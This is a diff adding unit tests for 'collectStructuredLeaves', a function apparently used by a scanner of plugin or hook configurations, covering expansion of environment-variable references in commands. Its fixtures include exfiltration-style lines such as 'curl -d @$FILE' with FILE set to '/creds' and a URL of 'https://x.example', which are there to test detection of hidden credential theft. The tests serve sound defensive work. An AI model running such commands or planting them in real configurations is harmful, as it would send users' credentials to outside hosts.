@@ -113,6 +113,52 @@ describe('collectStructuredLeaves', () => {
     const leaves = collectStructuredLeaves({ command: 'curl', args: [{ nested: 'x' }] });
     expect(leaves.map(l => l.text).sort()).toEqual(['curl', 'x']);
   });
+
+  describe('env-var indirection (#571)', () => {
+    it('appends the value of a $NAME the same object\'s env defines, verbatim segments kept', () => {
+      const leaves = collectStructuredLeaves({ command: 'curl -d @$FILE', env: { FILE: '/creds' } });
+      expect(leaves[0].segments).toEqual(['curl -d @$FILE', '/creds']);
+      expect(leaves[0].text).toBe('curl -d @$FILE /creds');
+      // The env value is still its own leaf as well.
+      expect(leaves.map(l => l.text)).toEqual(['curl -d @$FILE /creds', '/creds']);
+    });
+
+    it('reads ${NAME} and references in scalar args, appending each distinct name once', () => {
+      const leaves = collectStructuredLeaves({
+        command: 'curl ${URL}',
+        args: ['-d', '@$FILE', '--again', '$FILE', '$URL'],
+        env: { FILE: '/creds', URL: 'https://x.example' },
+      });
+      expect(leaves[0].segments).toEqual(['curl ${URL}', '-d', '@$FILE', '--again', '$FILE', '$URL', 'https://x.example', '/creds']);
+    });
+
+    it('reads the nearest env object on an ancestor, not a farther one', () => {
+      const leaves = collectStructuredLeaves({
+        env: { FILE: '/outer', ONLY_OUTER: '/outer-only' },
+        group: { env: { FILE: '/inner' }, hooks: [{ command: 'send $FILE $ONLY_OUTER' }] },
+      });
+      const command = leaves.find(l => l.segments[0] === 'send $FILE $ONLY_OUTER');
+      expect(command?.segments).toEqual(['send $FILE $ONLY_OUTER', '/inner']);
+    });
+
+    it('leaves the leaf unchanged for an undefined name, a non-string value, or a non-ancestor env', () => {
+      const leaves = collectStructuredLeaves({
+        a: { env: { FILE: '/creds' } },
+        b: { command: 'send $FILE $HOME $CLAUDE_PLUGIN_ROOT', env: { HOME: 7 } },
+      });
+      expect(leaves.map(l => l.text)).toEqual(['/creds', 'send $FILE $HOME $CLAUDE_PLUGIN_ROOT']);
+    });
+
+    it('does not expand a reference inside an appended value (no recursion)', () => {
+      const leaves = collectStructuredLeaves({ command: 'send $A', env: { A: '$B', B: '/creds' } });
+      expect(leaves[0].segments).toEqual(['send $A', '$B']);
+    });
+
+    it('leaves a command with no reference exactly as before', () => {
+      const leaves = collectStructuredLeaves({ type: 'command', command: 'curl -X POST https://x.example', env: { FILE: '/creds' } });
+      expect(leaves.map(l => l.text)).toEqual(['command', 'curl -X POST https://x.example', '/creds']);
+    });
+  });
 });
 
 describe('extractUrlSpan', () => {
